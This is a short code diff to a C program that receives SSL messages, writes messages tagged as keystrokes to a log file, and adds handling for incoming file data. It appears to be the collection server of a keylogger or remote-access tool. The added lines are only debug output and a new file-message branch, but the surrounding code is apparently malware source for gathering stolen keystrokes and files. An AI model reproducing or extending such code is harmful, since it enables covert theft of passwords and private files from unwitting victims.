@@ -116,11 +116,16 @@ int main(void) {
             }
             int size;
             while ((size = SSL_read(ssl, buffer, MAX_PAYLOAD)) > 0) {
+                printf("Got %d bytes\n", size);
+                fflush(stdout);
                 if (buffer[0] == 'k') {
                     buffer[size] = '\n';
                     //Keystroke message
                     fwrite(buffer + 1, 1, size, key_file);
                     fflush(key_file);
+                } else if (buffer[0] == 'f') {
+                    printf("Got %d bytes of a file\n", size);
+                    fflush(stdout);
                 } else {
                     for (int i = 0; i < size; ++i) {
                         printf("%c", buffer[i]);
